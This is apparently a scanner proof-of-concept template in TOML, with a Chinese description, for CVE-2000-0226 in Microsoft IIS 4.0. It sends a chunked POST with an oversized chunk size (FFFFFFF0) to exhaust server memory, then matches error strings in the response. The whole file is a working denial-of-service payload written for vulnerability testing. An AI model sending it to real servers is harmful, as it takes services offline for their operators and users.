[info]
author = "ave"
description = "向 IIS 4.0 发送 Transfer-Encoding: chunked 的 POST 请求，其中 chunk-size 设置为超大的十六进制值（如 FFFFFFF0），触发服务器分配过量内存导致拒绝服务。该漏洞为内存耗尽型 DoS，非 RCE。"
id = "POC-AVE-2000-0202"
name = "Microsoft IIS 4.0 Chunked Transfer Encoding Buffer Overflow PoC"
severity = "medium"
tags = ["ave-2000-0202"]
vuln_id = [
    "CVE-2000-0226",
    "AVE-2000-0202",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
FFFFFFF0\r
\r
0\r
\r
"""
type = "raw"

[poc.requests.headers]
Transfer-Encoding = "chunked"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "Connection: close",
]
